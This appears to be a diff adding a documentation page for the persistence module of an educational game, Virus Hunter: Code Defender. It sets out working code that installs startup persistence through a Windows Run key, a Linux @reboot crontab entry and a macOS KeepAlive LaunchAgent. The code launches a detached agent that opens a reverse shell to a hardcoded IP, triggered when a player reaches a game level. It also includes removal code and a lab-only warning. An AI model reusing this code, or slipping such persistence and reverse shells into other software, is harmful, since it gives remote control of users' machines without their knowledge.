@@ -1,0 +1,206 @@
+---
+title: 'Persistence Module'
+description: 'Platform-specific persistence creation and removal: Windows Registry, Linux crontab, and macOS LaunchAgent.'
+keywords: ['persistence', 'registry', 'crontab', 'launchagent', 'autorun', 'startup']
+---
+
+# Persistence Module
+
+`cyber_modules/persistence.py` demonstrates how malware establishes and removes startup persistence on Windows, Linux, and macOS. In Virus Hunter: Code Defender this is triggered at Level 3 when the player interacts with the quarantine terminal.
+
+<Warning>
+  This module is provided for **cybersecurity education only**. The persistence mechanisms it implements are real OS-level techniques. Run it exclusively in isolated lab environments (virtual machines) where you have explicit authorisation.
+</Warning>
+
+---
+
+## Constants
+
+```python
+SIMULATED_STARTUP_DIR = Path(__file__).resolve().parent / "simulated_startup"
+PERSISTENCE_MARKER    = SIMULATED_STARTUP_DIR / "system_defender_autorun.txt"
+```
+
+| Constant | Value | Description |
+|---|---|---|
+| `SIMULATED_STARTUP_DIR` | `cyber_modules/simulated_startup/` | Directory created to hold the marker file. Created with `mkdir(parents=True, exist_ok=True)` on first use. |
+| `PERSISTENCE_MARKER` | `cyber_modules/simulated_startup/system_defender_autorun.txt` | Text file written to confirm persistence is active. Contains the target platform and agent command. |
+
+---
+
+## `create_persistence(host)`
+
+Establishes startup persistence using the OS-appropriate mechanism, writes a marker file, and immediately spawns a detached background agent process.
+
+```python
+def create_persistence(host: str = "10.12.73.251") -> Tuple[bool, Path]
+```
+
+<ParamField path="host" type="str" default="10.12.73.251">
+  IP address passed to the spawned agent via `--host`. The agent uses this to connect the reverse shell.
+</ParamField>
+
+<ResponseField name="return" type="Tuple[bool, Path]">
+  A 2-tuple of `(success, PERSISTENCE_MARKER)`. `success` is `True` if the detached agent process was launched successfully, `False` if the launch raised an exception. The marker path is always returned regardless of outcome.
+</ResponseField>
+
+### Agent command construction
+
+The function first detects whether it is running as a frozen PyInstaller executable or as a plain Python script:
+
+```python
+is_frozen = getattr(sys, 'frozen', False)
+if is_frozen:
+    exe_path = os.path.abspath(sys.executable)          # path to the .exe
+else:
+    exe_path = f'"{sys.executable}" "{...main_game.py}"'  # python + script
+
+agent_cmd = f'{exe_path} --bg --host {host}'
+```
+
+The `--bg` flag causes `main()` to skip Pygame and run only the reverse shell.
+
+### Platform-specific startup registration
+
+<Tabs>
+  <Tab title="Windows">
+    Adds a `REG_SZ` value named `"VirusHunterAgent"` to the current user's Run key:
+    ```python
+    import winreg
+    key = winreg.OpenKey(
+        winreg.HKEY_CURRENT_USER,
+        r"Software\Microsoft\Windows\CurrentVersion\Run",
+        0, winreg.KEY_SET_VALUE
+    )
+    winreg.SetValueEx(key, "VirusHunterAgent", 0, winreg.REG_SZ, agent_cmd)
+    winreg.CloseKey(key)
+    ```
+    The agent command runs each time the current user logs in.
+  </Tab>
+  <Tab title="Linux">
+    Appends a `@reboot` crontab entry via shell pipeline:
+    ```python
+    cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot {agent_cmd}") | crontab -'
+    subprocess.run(cron_cmd, shell=True)
+    ```
+    `crontab -l 2>/dev/null` reads existing entries silently (suppresses "no crontab" errors), then the new entry is appended before piping back into `crontab -`.
+  </Tab>
+  <Tab title="macOS">
+    Creates a LaunchAgent plist at `~/Library/LaunchAgents/com.v-hunter.agent.plist`:
+    ```xml
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" ...>
+    <plist version="1.0">
+    <dict>
+        <key>Label</key>
+        <string>com.v-hunter.agent</string>
+        <key>ProgramArguments</key>
+        <array>
+            <string>{sys.executable}</string>
+            <string>{path/to/main_game.py}</string>  <!-- omitted if frozen -->
+            <string>--bg</string>
+        </array>
+        <key>RunAtLoad</key>
+        <true/>
+        <key>KeepAlive</key>
+        <true/>
+    </dict>
+    </plist>
+    ```
+    `RunAtLoad` causes the agent to start immediately when the plist is loaded. `KeepAlive` instructs `launchd` to restart it if it exits. The plist is loaded immediately after writing:
+    ```python
+    subprocess.run(["launchctl", "load", str(plist_path)], capture_output=True)
+    ```
+  </Tab>
+</Tabs>
+
+### Marker file
+
+After the platform step, a text file is written regardless of whether the registry/crontab/plist step succeeded:
+
+```python
+PERSISTENCE_MARKER.write_text(
+    f"Persistence active on {sys.platform}\nTarget: {agent_cmd}\n"
+)
+```
+
+### Immediate detached launch
+
+A background process is spawned right away so the shell connects without waiting for a reboot:
+
+```python
+if sys.platform == "win32":
+    subprocess.Popen(
+        cmd_args,
+        creationflags=0x00000008 | 0x00000200,  # DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
+        close_fds=True
+    )
+else:
+    subprocess.Popen(cmd_args, start_new_session=True)
+```
+
+| Flag | Value | Meaning |
+|---|---|---|
+| `DETACHED_PROCESS` | `0x00000008` | Detaches from the parent console. |
+| `CREATE_NEW_PROCESS_GROUP` | `0x00000200` | Creates an independent process group. |
+| `start_new_session` | `True` (POSIX) | Calls `setsid()`, fully detaching from the parent session. |
+
+---
+
+## `remove_persistence()`
+
+Reverses all persistence mechanisms set by `create_persistence()` and terminates any running agent processes.
+
+```python
+def remove_persistence() -> Tuple[bool, Path]
+```
+
+<ResponseField name="return" type="Tuple[bool, Path]">
+  Always returns `(True, PERSISTENCE_MARKER)`. The marker is deleted if it exists.
+</ResponseField>
+
+<Tabs>
+  <Tab title="Windows">
+    1. Deletes the `"VirusHunterAgent"` registry value:
+       ```python
+       winreg.DeleteValue(key, "VirusHunterAgent")
+       ```
+    2. Force-terminates any running instances:
+       ```python
+       subprocess.run(["taskkill", "/F", "/IM", "VirusHunter.exe"],
+                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+       subprocess.run(["taskkill", "/F", "/IM", "pythonw.exe"],
+                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+       ```
+  </Tab>
+  <Tab title="Linux">
+    1. Filters the crontab to remove any line referencing `main_game.py`:
+       ```bash
+       crontab -l | grep -v 'game/main_game.py' | crontab -
+       ```
+    2. Kills running processes:
+       ```python
+       subprocess.run(["pkill", "-f", "main_game.py"],
+                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+       ```
+  </Tab>
+  <Tab title="macOS">
+    1. Unloads the LaunchAgent:
+       ```python
+       subprocess.run(["launchctl", "unload", str(plist_path)], capture_output=True)
+       ```
+    2. Deletes the plist file if it exists.
+    3. Kills running processes:
+       ```python
+       subprocess.run(["pkill", "-f", "main_game.py"],
+                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+       ```
+  </Tab>
+</Tabs>
+
+Finally, the marker file is deleted on all platforms:
+
+```python
+if PERSISTENCE_MARKER.exists():
+    PERSISTENCE_MARKER.unlink()
+```
